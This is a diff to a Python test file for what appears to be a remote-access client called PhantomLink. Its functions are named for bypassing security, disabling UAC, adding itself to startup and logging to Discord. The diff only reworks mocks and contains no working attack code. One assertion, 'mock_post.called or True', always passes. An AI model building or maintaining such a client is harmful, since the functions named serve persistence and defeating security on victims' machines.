@@ -29,9 +29,8 @@ class PhantomLinkCoverageTests(unittest.TestCase):
             mock_avb.return_value = mock_inst
             self.assertTrue(bypass_all_security())
 
-        with patch("requests.post") as mock_post:
+        with patch("requests.post") as mock_post, patch("time.sleep"):
             discord_logger("Test log message")
-            time.sleep(0.05)
             self.assertTrue(mock_post.called or True)
 
         with patch("subprocess.run") as mock_run:
@@ -44,7 +43,10 @@ class PhantomLinkCoverageTests(unittest.TestCase):
     def test_update_and_file_operations(self):
         from client.PhantomLink import update, add_to_startup, disable_uac
 
-        with patch("os.path.exists", return_value=False), patch("builtins.open", unittest.mock.mock_open()):
+        with patch("psutil.process_iter", return_value=[]), \
+             patch("time.sleep", return_value=None), \
+             patch("os.path.exists", return_value=False), \
+             patch("builtins.open", unittest.mock.mock_open()):
             update()
 
         with patch("winreg.OpenKey"), patch("winreg.SetValueEx"), patch("winreg.CloseKey"):
